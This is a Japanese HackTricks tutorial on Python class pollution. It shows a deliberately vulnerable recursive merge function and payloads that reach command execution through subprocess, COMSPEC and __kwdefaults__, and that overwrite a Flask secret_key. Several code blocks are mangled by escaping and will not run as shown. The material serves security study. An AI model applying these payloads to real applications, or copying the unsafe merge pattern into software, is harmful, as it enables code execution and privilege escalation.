# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に **参加** または **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **をフォロー** してください。
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに PR を提出して **ハッキングテクニックを共有** してください。

</details>

## 基本的な例

文字列でオブジェクトのクラスを汚染する方法を確認してください：

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## 基本的な脆弱性の例

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## ガジェットの例

<details>

<summary>クラスプロパティのデフォルト値をRCE（サブプロセス）に設定する</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary><code>globals</code>を通じて他のクラスやグローバル変数を汚染する</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>任意のサブプロセスの実行</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary>__kwdefaults__の上書き</summary>

**`__kwdefaults__`**は、すべての関数の特別な属性です。Pythonの[ドキュメント](https://docs.python.org/3/library/inspect.html)によると、これは「**キーワード専用**パラメータのデフォルト値のマッピング」です。この属性を汚染することで、関数のキーワード専用パラメータのデフォルト値を制御できます。これらは\*または\*argsの後に来る関数のパラメータです。
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>別ファイルでFlaskのsecretを上書きする</summary>

したがって、WebのメインPythonファイルで定義されたオブジェクトにクラスポリューションを行うことができますが、**そのクラスがメインファイルとは異なるファイルで定義されています**。前述のペイロードで\_\_globals\_\_にアクセスするには、オブジェクトのクラスまたはクラスのメソッドにアクセスする必要があるため、**そのファイルのグローバルにアクセスできますが、メインファイルではできません**。\
したがって、メインページで**secret key**を定義したFlaskアプリのグローバルオブジェクトにアクセスすることはできません：

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

このシナリオでは、メインファイルにアクセスしてFlaskのシークレットキーを変更し、このキーを知ることで特権を昇格させるために、ファイルをトラバースするガジェットが必要です。

このようなペイロードは、[この解説](https://ctftime.org/writeup/36082)から取得できます：

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

このペイロードを使用して、`app.secret_key`（アプリ内の名前は異なる場合があります）を変更して、新しい特権を持つFlaskクッキーに署名できるようにします。

</details>

読み取り専用のガジェットについても次のページをチェックしてください：

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## 参考文献

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* **💬** [**Discordグループ**](https://discord.gg/hRep4RUj7f)**または**[**telegramグループ**](https://t.me/peass)**に参加するか、Twitter 🐦** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**で**フォロー\*\*してください。
* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。 [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)

</details>
